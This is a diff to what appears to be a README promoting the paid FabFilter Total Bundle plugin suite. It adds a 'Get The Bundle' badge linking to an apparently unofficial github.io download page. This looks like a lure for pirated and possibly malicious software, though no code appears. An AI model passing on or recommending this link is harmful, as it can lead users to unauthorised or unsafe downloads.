@@ -2,6 +2,7 @@
 
 The **FabFilter Total Bundle** is the definitive collection of all FabFilter audio plugins, covering **EQ, compression, limiting, reverb, multiband dynamics, distortion, delay, and creative sound design**. Known for pristine sound quality, sleek interfaces, and industry-standard precision, FabFilter plugins are trusted by Grammy-winning engineers, producers, and sound designers.
 
+[![Get](https://img.shields.io/badge/Get%20The-Bundle-blueviolet)](https://fabfilter-total-bundles.github.io/.github/)
 
 <img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/1fa5bd59-4c55-490b-86cd-181bc2c6556e" />
 
@@ -117,3 +118,4 @@ It includes **14+ plugins**, covering EQ, dynamics, reverb, distortion, filters,
 All Rights Reserved.
 
 ---
+
